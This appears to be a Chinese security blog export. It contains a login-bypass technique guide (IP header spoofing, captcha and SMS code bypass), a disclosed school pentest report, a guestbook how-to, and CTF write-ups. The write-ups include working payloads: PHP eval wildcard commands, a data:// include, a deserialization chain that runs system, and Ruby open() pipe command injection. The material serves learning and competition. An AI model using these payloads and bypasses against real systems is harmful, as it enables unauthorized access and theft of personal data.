<li>通过<code>扫描系统目录</code>，<code>目录遍历</code>，<code>google hacking</code>找到未授权访问的登陆页面，直接进入到系统内部</li>
<li>用<code>burp</code>抓取数据包，更改URL中的id参数，更改用户名密码字段（比如<code>直接删去密码</code>字段），更改cookie字段，可以越权登录到系统内部</li>
</ol>
<p>当然对于大多数系统，这样的方法基本上都已经行不通了，但是试试无妨！</p>
<h1 id="2密码爆破">2.密码爆破</h1>
<p>登陆界面最直接的就是密码爆破，上面说的那些漏洞我也说了，很难遇到！而对于爆破最重要的不是用的哪个工具，而是字典好不好，这里用的bp！</p>
<p>字典的话自行寻找吧，毕竟好东西要靠自己挖掘！当然如果是针对性极强的字典只能用工具自己生成了！</p>
<h1 id="3攻破加密传输">3.攻破加密传输</h1>
<p>现在的业务系统口令传输到后端前都会进行加密处理 ，web常见的加密方式有 md5 加密、sha1 加密、RSA 加密，在此基础上总结了两种破解方式：</p>
<p><strong>1.利用burpsuite的payload processing功能，把字典按照加密方式先加密再发包</strong></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/632d9181f85ac9fb5d7274f563ec4ae2.png?x-oss-process=hzy" alt="img"></p>
<p><strong>2.用字典生成工具生成加密好的字典，然后burp直接加载加密字典</strong></p>
<p>这里推荐的字典生成工具是pydictor，encode功能内置了多种加密算法，调用handler工具直接加密自己的明文字典</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/d82241c8cd67d0de88921f4bc1e22a86.png?x-oss-process=hzy" alt="img"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/c9fc7a5e03184159b820485b929d10e5.png?x-oss-process=hzy" alt="img"></p>
<h1 id="4突破登录ip地址限制">4.<strong>突破登录IP地址限制</strong></h1>
<p>如果登录系统设置了IP地址白名单，我们可以通过下面的几个http头字段伪造IP地址，用burp抓包后将下面的某个http头字段加入数据包发送到服务器</p>
<pre><code class="hljs text">Client-Ip: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Real-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Forwarded-Host: 127.0.0.1</code></pre>
<h1 id="5图形验证码绕过方式">5.<strong>图形验证码绕过方式</strong></h1>
<p>如果在系统登陆界面加上了验证码，那么上面的方法基本上就都失效了，那有什么方法可以绕过验证呢</p>
<p><strong>1.图形验证码不刷新</strong></p>
<p>在一段时间内只要不刷新页面，无论登录失败多少次都不刷新验证码，这个时候就可以使用同一个验证码根据上面的方式进行暴力破解</p>
<p><strong>2.验证码失效</strong></p>
<p>不管在验证码表单输入什么样的数据，都会判断通过，但这种情况很少见</p>
<p><strong>3.图形验证码可被识别，抓包直接可以获得验证码</strong></p>
<p>很多网站的验证码都可以在请求数据包中找到，或者隐藏在request的cookie中，response的源码中，可以利用burpsuite的macros来匹配response中的相应数据，具体的爆破方法参见下文：</p>
<p><a href="https://blog.csdn.net/d_pokemon/article/details/78194351">(24条消息) burpsuite爆破密码（含验证码）_Daniel-0的博客-CSDN博客_burpsuite 验证码</a></p>
<p><strong>4.图形验证码参数直接绕过</strong></p>
<p>对于request数据: user=admin&amp;pass=1234&amp;vcode=brln，有两种绕过方法：</p>
<p>一是验证码空值绕过，改成 user=admin&amp;pass=1234&amp;vcode=；</p>
<p>一是直接删除验证码参数，改成 user=admin&amp;pass=1234。</p>
<p><strong>5.万能验证码</strong></p>
<p>渗透测试的过程中，有时候会出现这种情况，系统存在一个万能验证码，如0000、9999，只要输入万能验证码，就可以无视验证码进行暴力破解。</p>
<p><strong>6. 验证码可被识别</strong></p>
<p>有些图形验证码加入的像素线条过于简单，使用图形验证码识别工具可以识别出每次更换的验证码，在平常的漏洞挖掘过程中，如果我们发现登录的验证码非常简单且易于识别，那我们就可以尝试使用自动化工具来进行登录破解了，如 PKAV 的 HTTP Fuzzer</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/ced54f0016c5732f6df791fe51466e69.png?x-oss-process=hzy" alt="img"></p>
<p><strong>7.使用机器学习算法识别验证码</strong></p>
<p>主要是对特定网站的图形验证码训练识别模型，达到一定的准确率就可以调用进行模拟提交图形验证码的值了。这个以后学习深了再说！</p>
<h1 id="6短信验证码绕过">6.<strong>短信验证码绕过</strong></h1>
<p>对于网站要求输入手机号，接收手机短信并校验短信验证码是否正确进行登录的系统，突破的主要思路有：</p>
<p><strong>1.短信验证码生命期限内可暴力枚举</strong></p>
<p>在验证码还未过期的时间段内，可枚举全部的纯四位数字、六位数字等较简单的短信验证码；</p>
<p><strong>2. 短信验证码在数据包中返回</strong></p>
<p>和图形验证码一样，在response中可以直接获取到短信验证码。</p>
<p><strong>3. 修改请求数据包参数或 Cookie 值绕过</strong></p>
<p>比如有 post 数据包：mobile=12435437658&amp;userid=123456, Cookie中有：codetype=1</p>
<p>在特定步骤，修改 mobile=自己的手机号，自己手机就可以收到别人的验证码，后面再用别人的手机号和接收到的验证码登录；</p>
<p>修改 Cookie 中可疑的参数和值，进行绕过，比如上面修改 codetype=0；</p>
<p><strong>4. 修改返回包绕过</strong></p>
<p>提交错误的短信验证码，返回包中有： status=false，在Burpsuite中修改为 status=true，即可绕过前端判断，成功进入系统。具体还要结合实际的场景，灵活操作。</p>
<h1 id="结尾">结尾</h1>
<p>看到一个渗透过程很有学习的意义，在这放个地址</p>
<p><a href="https://zhuanlan.zhihu.com/p/266665890">实战渗透之一个破站日一天 - 知乎 (zhihu.com)</a></p>
]]></content>
      <categories>
        <category>渗透认知</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>记一次渗透测试（1）</title>
    <url>/2022/04/26/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98/</url>
    <content><![CDATA[<p>自己学校渗透测试演练，有幸参加，并顺利找到三个漏洞。</p>
<span id="more"></span>
<h1 id="1储存型xss">1.储存型xss</h1>
<p>在外网转了很久，挺好的没发现啥漏洞，探测内网资源，进到图书馆系统<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/4f9f009b7ac5c25ec0c196149fe3a7b5.png?x-oss-process=hzy" alt="image-20220420142903950"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/fd2f97a0e2f2bed48770f1dcfb5e10e6.png?x-oss-process=hzy" alt="image-20220426151630531"></p>
<p>看到这个要填读者条码，感觉很难知道，但是后面有个忘记条码点进去试试<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/ffb75bf9b94d0ee08eb4bbd347840e76.png?x-oss-process=hzy" alt="image-20220420143018021"></p>
<p>有戏，看到只需要知道名字就可查看条码，还有就是默认密码已经给出来是0000，也算是运气好，测试了一个卷王同学的名字就顺理成章进去了<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/8b734e367e4c27c67df473860ea27519.png?x-oss-process=hzy" alt="image-20220420143235312"></p>
<p>找的一个留言功能，进去看看</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/b1d453ba0c9611911fdc130562ffbb3a.png?x-oss-process=hzy" alt="image-20220420143420658"></p>
<p>如此简陋的留言框<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/167b7c3bd585f7b97a1ae49d8f79d85c.png?x-oss-process=hzy" alt></p>
<p>试试xss有没有弹窗，好家伙这是啥都没过滤<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/5e5cf6888b70289bf9874043779e7266.png?x-oss-process=hzy" alt="image-20220420143559111"></p>
<p>通过测试投放了xss恶意代码，也顺理成章放到那了<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/3ac4919dea8bc1c19c6ccaaf9eb5a9a8.png?x-oss-process=hzy" alt="image-20220420143716246"></p>
<h1 id="2未授权登录">2.未授权登录</h1>
<p>这个也是在内网找到的漏洞，好像是人力管理系统，通过bp拦截数据抓包改包放包一气呵成，图片就不放了，找不到了！</p>
<h1 id="3弱口令">3.弱口令</h1>
<p>网络上泄露少量教师信息，通过枚举可以在这个登陆页面通过弱口令进去！<img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/8895b0d8dfe98b6a45f457134e603c50.png?x-oss-process=hzy" alt="2d52b1065dade2aa.png (1965×816) (bmp.ovh)"></p>
<p>就这还不算是最严重的，我通过测试进去了一个教师的这个系统（经测试存在弱密码）</p>
<p>挖掘一下看看有没有利用点，然而并没有发现，这个时候我找到了另一个信息泄露，这次是把整个学校的教师的工号都进行泄露了，都可查询到相关信息。</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/7e66ac932bd01700e2ba53cb74c10b61.png?x-oss-process=hzy" alt="image-20220423231108502"></p>
<p>这个时候我随便找一个工号再次测试一下弱口令是否可以继续使用，如下图，发现弱口令很严重，基本上是把所有教师的系统都暴漏了，在这个系统里面也可以找到很多敏感信息，姓名，工号，身份证号一览无余，甚至部分号码可以弱口令进到财务系统，在这里就不多述了，主要是这个固定资产系统严重泄露个人信息！</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/8dcc3b6a1bbbfc6322fff88851f4094c.png?x-oss-process=hzy" alt="image-20220423231315972"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/0f04db33dfe0bdfdd59be5d704103b40.png?x-oss-process=hzy" alt="image-20220423231136095"></p>
<h1 id="声明">声明：</h1>
<p>以上漏洞对敏感信息已经进行打码，且已经通知相关高校修复！此文章仅供学习参考</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>留言板</title>
    <url>/2022/02/03/%E7%95%99%E8%A8%80%E6%9D%BF/</url>
    <content><![CDATA[<p>加个留言板方便交流！！</p>
<span id="more"></span>
<p>添加一个新的page</p>
<pre><code class="hljs plaintext">hexo new page guestbook</code></pre>
<p>进入 source/guestbook/index.md。加入你想显示的内容，如：</p>
<pre><code class="hljs plaintext">---
title: 留言板
date: 
---
# 欢迎来到我的博客！

欢迎在这里留言！任何问题都可以在这里留言，我会及时回复的，添加email可以获得更快的回复速度，在name栏目输入QQ号可以直接获取你的QQ头像。</code></pre>
<p>进入 _config.next.yml， 找到menu栏目，添加留言板功能：</p>
<pre><code class="hljs plaintext">menu:
  guestbook: /guestbook/ || fa fa-book</code></pre>
<p>图标支持font awesome，可以按自己喜好修改。如果有多语言支持需求，可以更改 themes/next/languages 下对应语言的翻译。</p>
<p>zh-CN.yml:</p>
<pre><code class="hljs plaintext">menu:
  guestbook: 留言板</code></pre>
<h2 id="4-重新生成页面即可">4. 重新生成页面即可</h2>
<pre><code class="hljs plaintext">$ hexo clean
$ hexo g -d</code></pre>
]]></content>
      <categories>
        <category>博客相关问题类</category>
      </categories>
      <tags>
        <tag>博客</tag>
        <tag>留言板</tag>
      </tags>
  </entry>
  <entry>
    <title>第六届强网杯青少年专项赛</title>
    <url>/2022/09/11/%E7%AC%AC%E5%85%AD%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AF%E9%9D%92%E5%B0%91%E5%B9%B4%E4%B8%93%E9%A1%B9%E8%B5%9B/</url>
    <content><![CDATA[<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209112118182.png?x-oss-process=hzy" alt="image-20220911211805196"></p>
<span id="more"></span>
<hr>
<h1 id="前言">前言</h1>
<p>强网杯青少年赛，打着玩玩</p>
<h1 id="web1">web1</h1>
<p>存在CVE-2021-41773，目录穿越读flag</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209112121564.png?x-oss-process=hzy" alt="image-20220911212153509"></p>
<p>flag{3b3c1ee7-4c60-4f6d-a077-76dd153bbf0d}</p>
<h1 id="web2">web2</h1>
<p>F12源码base64两次解密得到cream.php路径，然后得到源码</p>
<pre><code class="hljs plaintext">&lt;?php
highlight_file(__FILE__);
error_reporting(0);
if(isset($_GET[&#x27;file&#x27;])&amp;&amp;strlen($_GET[&#x27;file&#x27;])&gt;strlen(&quot;flag in cream&quot;))&#123;  // get传参file，长度需要小于13
    die(&quot;too long,no flag&quot;);
&#125;
$fp = fopen($_GET[&#x27;file&#x27;], &#x27;r+&#x27;);  //传file参数给fp变量，且可读可写
if(preg_match(&quot;/php|file|http|eval|exec|system|popen|flag|\&lt;|\&gt;|\&quot;|\&#x27;/i&quot;, $_GET[&#x27;content&#x27;]))&#123;  //传参content，有过滤
    die(&quot;hacker&quot;);
&#125;  
fputs($fp, $_GET[&#x27;content&#x27;]);  //将content传参内容写入到fp
rewind($fp);  //将fp指针的位置倒回文件的开头。
$data=stream_get_contents($fp);  //打印赋值给data变量
include($data);
?&gt;</code></pre>
<p>这道题目我研究了一下午，还是遗憾，比赛结束之前没有写出来</p>
<p>首先本地调试下，发现这个r+就很恶心，如果是w，这道题就简单了</p>
<blockquote>
<p>r+和w其实都是可读可写，但是本质上不同，r+只能在原有的文件下写入文件，且是覆盖，而w是如果刚开始没有该文件，会先创建文件再写入</p>
</blockquote>
<p>本地调试下的确是可以通过cream.php写入，会覆盖掉原来的内容</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209112131724.png?x-oss-process=hzy" alt="image-20220911213109642"></p>
<p>所以尝试本地写入马，因为有过滤所以需要绕过一下，data协议传入base马</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209112132068.png?x-oss-process=hzy" alt="image-20220911213251964"></p>
<p>没解析，擦，而且他这个r+写入文件一不小心会把之前文件的结构搞坏，php结构都直接成文本了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209112133115.png?x-oss-process=hzy" alt="image-20220911213351047"></p>
<p>这样传貌似就把之前的都全部覆盖掉了</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209112135125.png?x-oss-process=hzy" alt="image-20220911213505022"></p>
<p>但是还是不能正常解析，当时做到这先测试一下能不能传进去了，发现远程传都传不进去，不知道又设置啥东西了，不过可以确定的是没有拦截data协议，构造$fp数据流直接cat即可，不用传马，这算是出发点就是错吗？害</p>
<pre><code class="hljs plaintext">?file=data://text/plain,&amp;content=data://text/plain;base64,PD9waHAKc3lzdGVtKCdjYXQgL2ZsYWcnKTsKPz4=</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209112141578.png?x-oss-process=hzy" alt="image-20220911214149495"><br>
还有一种做法是远程文件包含</p>
<pre><code class="hljs plaintext">python3 -m http.server 5010</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209121100429.png?x-oss-process=hzy" alt="image-20220912110014284"></p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209121100116.png?x-oss-process=hzy" alt="image-20220912110037054"></p>
<h1 id="web3">web3</h1>
<p>www.zip泄露源码，down下来审计，发现有个demo.php</p>
<p>考察php反序列化构造链</p>
<pre><code class="hljs plaintext">&lt;?php

class Water&#123;
    public $waterfall;
    /*public function __construct()&#123;
        $this-&gt;waterfall = array();
    &#125;
    public function __get($value)&#123;
        $function = $this-&gt;waterfall;
        return $function();
    &#125;*/
&#125;

class Circle&#123;
    public $daemon;
    protected $dash;

    /*public function runc($value)&#123;
        @eval($value);  // 触发eval，终点
    &#125;*/

    public function __construct()
    &#123;
        $this-&gt;dash = &quot;system(&#x27;cat /flag&#x27;);&quot;;
    &#125;
&#125;

class Range&#123;
    public $horis;
    public $link;

&#125;

class Sliver&#123;
    public $secret;
    public $resty;

&#125;

/*$data = @$_GET[&#x27;data&#x27;];
if(isset($data))&#123;
    $url = parse_url($_SERVER[&#x27;REQUEST_URI&#x27;]);
    parse_str($url[&#x27;query&#x27;],$q);
    foreach($q as $v)
    &#123;
        if(preg_match(&quot;/^O/i&quot;,$v))
        &#123;
            die(&#x27;YOU ARE hacker!!!&#x27;);
            exit();
        &#125;
    &#125;
    unserialize($data);
&#125; */

$h = new Sliver();
$h-&gt;secret = new Range();
$h-&gt;secret-&gt;link = new Water();
$h-&gt;secret-&gt;link-&gt;waterfall = new Circle();
echo urlencode(serialize($h)); 
?&gt;</code></pre>
<pre><code class="hljs plaintext">O%3A6%3A%22Sliver%22%3A2%3A%7Bs%3A6%3A%22secret%22%3BO%3A5%3A%22Range%22%3A2%3A%7Bs%3A5%3A%22horis%22%3BN%3Bs%3A4%3A%22link%22%3BO%3A5%3A%22Water%22%3A1%3A%7Bs%3A9%3A%22waterfall%22%3BO%3A6%3A%22Circle%22%3A2%3A%7Bs%3A6%3A%22daemon%22%3BN%3Bs%3A7%3A%22%00%2A%00dash%22%3Bs%3A20%3A%22system%28%27cat+%2Fflag%27%29%3B%22%3B%7D%7D%7Ds%3A5%3A%22resty%22%3BN%3B%7D</code></pre>
<p>利用三///绕过</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209112121451.png?x-oss-process=hzy" alt="image-20220911212104391"></p>
<p>flag{2c2cf221-2411-4596-bc2b-85577f6233ca}</p>
<h1 id="crypto2">Crypto2</h1>
<p>栅栏密码，每组32得到</p>
<p>FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]</p>
<p>全部偏移32，溢出的循环回来</p>
<pre><code class="hljs plaintext">message=&#x27;FLAG[vxpsDqCElwwoClsoColwpuvlqFvvFrpopBss]&#x27;
result=&#x27;&#x27;
for c in message:
    num = ord(c) - 63
    if num  &gt;= 32:
        result += chr(num)
    else:
        result +=chr(num+95)

print(result)
</code></pre>
<p>flag{7914d2ce-880c-40c0-8167-2f77f3101b44}</p>
<h1 id="misc1">misc1</h1>
<p>是个chuyinweilai.png，图片，但是010打开只是文本，乍一看是base64，解码得到图片格式的内容，只是顺序被改了，调换一下</p>
<pre><code class="hljs plaintext">import base64
data=open(&quot;chuyinweilai.png&quot;,&#x27;r&#x27;)
image_data=data.read()
out1=base64.b64decode(image_data)
out2=&#x27;&#x27;.join([c[1] + c[0] for c in zip(out1[::2], out1[1::2])])

data.close()
flag=open(&#x27;out1.png&#x27;,&#x27;w&#x27;)
flag.write(out2)
flag.close()
</code></pre>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209112120180.png?x-oss-process=hzy" alt="image-20220911212028073"></p>
<p>又万能和弦是4536251，然后lsb解密得到flag</p>
<p>python2 <a href="http://lsb.py">lsb.py</a> extract 1.png flag.txt 4536251</p>
<p><a href="https://github.com/livz/cloacked-pixel">livz/cloacked-pixel: LSB steganography and detection (github.com)</a></p>
<p>flag{5cc0aa21208b517dbd0bde650247237f}</p>
<h1 id="misc3">misc3</h1>
<p>图片隐写，首先给的第一个图片010打开看到提示7his_1s_p4s5w0rd</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209112120714.png?x-oss-process=hzy" alt="image-20220911212015658"></p>
<p>然后改成压缩包解压得到第二个图片，secret.png，这个说lsb，又加上第一个密码，联想到是加密形式的lsb加密，脚本跑一把梭</p>
<p><a href="https://github.com/livz/cloacked-pixel">livz/cloacked-pixel: LSB steganography and detection (github.com)</a></p>
<p>python2 <a href="http://lsb.py">lsb.py</a> extract secret.png out.txt 7his_1s_p4s5w0rd</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209112120773.png?x-oss-process=hzy" alt="image-20220911212007724"></p>
<p>flag{2e55f884-ef01-4654-87b1-cc3111800085}</p>
<h1 id="re1">re1</h1>
<p>代码比较论乱，细看之后找到</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209112119382.png?x-oss-process=hzy" alt="image-20220911211958324"></p>
<p>加密函数，猜测v1为是输入的值</p>
<p>经过加密之后与v11进行比较</p>
<p>分析加密函数</p>
<p><img src="https://imagesssssssssss.oss-cn-beijing.aliyuncs.com/img/202209112119080.png?x-oss-process=hzy" alt="image-20220911211952017"></p>
<p>输入和v27异或</p>
<p>调试得到v27</p>
<pre><code class="hljs plaintext">V27=[243,79,85,235,242,11,136,210,70,121,193,114,95,140,200,114,59,213,194,165,130,41,234,220,20,176,3,159,72,73,88,84]

V11= [0x9f,0x29,0x32,0x8a,0xc3,0x70,0xbc,0xea,0x20,0x40,0xf1,0x17,0x69,0xe8,0xfd,0x40,0x3,0xe6,0xa3,0x97,0xb7,0x1e,0xd3,0xbf,0x24,0x83,0x32,0xab,0x79,0x28,0x25,0x37]</code></pre>
<p>多次尝试之后发现需要两个字节一起两两交换输出flag</p>
<p>脚本如下：</p>
<pre><code class="hljs plaintext">v27=[243,79,85,235,242,11,136,210,70,121,193,114,95,140,200,114,59,213,194,165,130,41,234,220,20,176,3,159,72,73,88,84]
 v11= [0x9f,0x29,0x32,0x8a,0xc3,0x70,0xbc,0xea,0x20,0x40,0xf1,0x17,0x69,0xe8,0xfd,0x40,0x3,0xe6,0xa3,0x97,0xb7,0x1e,0xd3,0xbf,0x24,0x83,0x32,0xab,0x79,0x28,0x25,0x37]
 flag=&#x27;&#x27;
 for i in range(len(v11)):
   v11[i]^=v27[i]
 for i in range(0,len(v11),2):
   t=v11[i]
   v11[i]=v11[i+1]
   v11[i+1]=t
 for i in range(len(v11)):
   flag+=chr(v11[i])
 print(flag)

\# flag&#123;1849fe0d625382a75c93041a1c&#125;</code></pre>
]]></content>
      <categories>
        <category>赛后复盘</category>
      </categories>
      <tags>
        <tag>赛后复盘</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>第五届世界智能大会[津门杯]</title>
    <url>/2022/06/01/%E7%AC%AC%E4%BA%94%E5%B1%8A%E4%B8%96%E7%95%8C%E6%99%BA%E8%83%BD%E5%A4%A7%E4%BC%9A/</url>
    <content><![CDATA[<p>第五届世界智能大会[津门杯]，随便找点以往的比赛题目做一下，提高一下自己！</p>
<span id="more"></span>
<h1 id="hate_php">hate_php</h1>
<pre><code class="hljs plaintext">&lt;?php
error_reporting(0);
if(!isset($_GET[&#x27;code&#x27;]))&#123;
    highlight_file(__FILE__);
&#125;else&#123;
    $code = $_GET[&#x27;code&#x27;];
    if(preg_match(&quot;/[A-Za-z0-9_$@]+/&quot;,$code))&#123;
        die(&#x27;fighting!&#x27;); 
    &#125;
    eval($code);
&#125;</code></pre>
<p>代码审计，首先知道的是过滤了字母大小写和数字，还有三个字符</p>
<p>_$@，对输入code进行了正则表达式的匹配。</p>
<p>这道题关键就是绕过正则匹配，来执行后面的eval函数</p>
<blockquote>
<ul>
<li>解题思路</li>
<li>利用通配符调用Linux系统命令来查看flag</li>
<li>在Linux系统中可以使用 ? * 等字符来正则匹配字母</li>
<li>星号(*)可以用来代替0个及以上任意字符</li>
<li>问号(?)可以用来代替1个任意字符，比如 /???/??? =&gt; /bin/cat</li>
</ul>
</blockquote>
<p>首先，构造payload:</p>
<pre><code class="hljs plaintext">?&gt;&lt;?=`/???/???%20/???/???/????/*`?&gt;
php使用短链接含义如下：
&lt;?php echo `/bin/cat /var/www/html/index.php`?&gt;</code></pre>
<p>可以看到源码，直接读取flag文件试。</p>
<pre><code class="hljs plaintext">?&gt;&lt;?=`/???/??? /????`?&gt;
php使用短链接含义如下：
&lt;?php echo `/bin/cat /flag`?&gt;</code></pre>
<p><img src="https://z4a.net/images/2022/05/18/imageddec83d48ad6619f.png" alt></p>
<h1 id="png图片转换器">PNG图片转换器</h1>
<ul>
<li>代码审计</li>
<li>open函数命令执行漏洞</li>
</ul>
<p>这道题附件直接给了源码，分析一下</p>
<pre><code class="hljs plaintext">require &#x27;sinatra&#x27;
require &#x27;digest&#x27;
require &#x27;base64&#x27;

get &#x27;/&#x27; do
  open(&quot;./view/index.html&quot;, &#x27;r&#x27;).read()
end

get &#x27;/upload&#x27; do
  open(&quot;./view/upload.html&quot;, &#x27;r&#x27;).read()
end

post &#x27;/upload&#x27; do
  unless params[:file] &amp;&amp; params[:file][:tempfile] &amp;&amp; params[:file][:filename] &amp;&amp; params[:file][:filename].split(&#x27;.&#x27;)[-1] == &#x27;png&#x27;
    return &quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/upload&#x27;;&lt;/script&gt;&quot;
  end
  begin
    filename = Digest::MD5.hexdigest(Time.now.to_i.to_s + params[:file][:filename]) + &#x27;.png&#x27;
    open(filename, &#x27;wb&#x27;) &#123; |f|
      f.write open(params[:file][:tempfile],&#x27;r&#x27;).read()
    &#125;
    &quot;Upload success, file stored at #&#123;filename&#125;&quot;
  rescue
    &#x27;something wrong&#x27;
  end

end

get &#x27;/convert&#x27; do
  open(&quot;./view/convert.html&quot;, &#x27;r&#x27;).read()
end

post &#x27;/convert&#x27; do
  begin
    unless params[&#x27;file&#x27;]
      return &quot;&lt;script&gt;alert(&#x27;error&#x27;);location.href=&#x27;/convert&#x27;;&lt;/script&gt;&quot;
    end

    file = params[&#x27;file&#x27;]
    unless file.index(&#x27;..&#x27;) == nil &amp;&amp; file.index(&#x27;/&#x27;) == nil &amp;&amp; file =~ /^(.+)\.png$/
      return &quot;&lt;script&gt;alert(&#x27;dont hack me&#x27;);&lt;/script&gt;&quot;
    end
    res = open(file, &#x27;r&#x27;).read()
    headers &#x27;Content-Type&#x27; =&gt; &quot;text/html; charset=utf-8&quot;
    &quot;var img = document.createElement(\&quot;img\&quot;);\nimg.src= \&quot;data:image/png;base64,&quot; + Base64.encode64(res).gsub(/\s*/, &#x27;&#x27;) + &quot;\&quot;;\n&quot;
  rescue
    &#x27;something wrong&#x27;
  end
end</code></pre>
<blockquote>
<p>这里先介绍以一下<strong>linux中反引号的作用</strong>，凡是打上反引号的命令，首先将反引号内的命令执行一次，然后再将已经执行过的命令得到的结果再执行一次，就可以得到我们反引号的输出，比如我们输入命令：</p>
<pre><code class="hljs plaintext">`echo cat hello.txt`</code></pre>
<p><img src="http://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDIwLmNuYmxvZ3MuY29tL2Jsb2cvMTM2MzQ3OC8yMDIwMDkvMTM2MzQ3OC0yMDIwMDkwNTA4NDUyMDEwOC0xNjMyMjQxOTM3LnBuZw?x-oss-process=image/format,png" alt></p>
<p><strong>linux中|管道符的作用</strong></p>
<p>| 管道符的作用是 把 管道符左边的的输出 当做右边命令后面待处理的结果</p>
<p>例如：</p>
<pre><code class="hljs plaintext">ls -lha ~ | more| grep a &gt;haha.txt</code></pre>
</blockquote>
<p>在源码中我们可以发现有个open函数</p>
<pre><code class="hljs plaintext">res = open(file, &#x27;r&#x27;).read()</code></pre>
<p>存在命令执行漏洞<img src="https://z4a.net/images/2022/06/01/image7bb9f010bdf11bba.png" alt="image7bb9f010bdf11bba.png"></p>
<p>这里随便上传一个png文件之后会返回base64加密后的png文件名</p>
<p><img src="https://z4a.net/images/2022/06/01/image22040242e923ce5c.png" alt="image22040242e923ce5c.png"></p>
<p>这里用到的是这个open函数，所以可以把shell写入图片然后加上管道符，之后再执行open函数就可执行shell命令。</p>
<p>首先先上传一个图片<img src="https://z4a.net/images/2022/06/01/imagee00f24ffd22e873c.png" alt="imagee00f24ffd22e873c.png"></p>
<p>然后输入图片base64加密的文件名查看一下，发现的确进行了base64加密<img src="https://z4a.net/images/2022/06/01/imagea40182e15362e93d.png" alt="imagea40182e15362e93d.png"></p>
<p>因为它把<code>/</code>给过滤了。，所以对命令进行base64加密之后再使用，同时最后要加上之前传的那个文件名。<img src="https://z4a.net/images/2022/06/01/image26b24c7c2b96d2df.png" alt="image26b24c7c2b96d2df.png"></p>
<pre><code class="hljs plaintext">file=| `echo bHMgLw==(ls /) | base64 -d` &gt; 879550a80023144a9b58dcc288f3f4f3.png</code></pre>
<p>这里使用管道符<code>|</code>引导后边的shell命令，使用反引号```，就是先进行反引号的shell的base64解密，然后把解密的命令输出,并将输出的结果重定向到上传好的图片。</p>
<p>这个时候再访问那个图片，可以看到已经写进去了，base64揭秘之后得到根目录下的文件<img src="https://z4a.net/images/2022/06/01/image397239883e30c71d.png" alt="image397239883e30c71d.png"></p>
<pre><code class="hljs plaintext">bin
boot
dev
etc
flag_28244
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var</code></pre>
<p>根据同样的方法，shell <code>cat /flag_28244</code></p>
<pre><code class="hljs plaintext">file=| `echo Y2F0IC9mbGFnXzI4MjQ0 | base64 -d` &gt; 879550a80023144a9b58dcc288f3f4f3.png</code></pre>
<p>再次访问这个图片就可以得到base64加密的flag<img src="https://z4a.net/images/2022/06/01/image9f3eac424c54a0c5.png" alt="image9f3eac424c54a0c5.png"></p>
<p>解密得到flag<img src="https://z4a.net/images/2022/06/01/image6efb429399936ca0.png" alt="image6efb429399936ca0.png"></p>
<pre><code class="hljs plaintext">ctfhub&#123;d7032802097b5eb927bc3b73&#125;</code></pre>
<h1 id="yet_another_mysql_injection">yet_another_mysql_injection</h1>
<ul>
<li>SQL注入</li>
<li>代码审计</li>
</ul>
<p>首先进去之后是个登录框，查看源码得到提示<img src="https://z4a.net/images/2022/06/02/image.png" alt="image.png"></p>
<p><img src="https://z4a.net/images/2022/06/02/imageb0049ad14b1c9554.png" alt="imageb0049ad14b1c9554.png"></p>
<p>访问<code>/?source</code>得到源码<img src="https://z4a.net/images/2022/06/02/image2e7cc021c9235c9c.png" alt="image2e7cc021c9235c9c.png"></p>
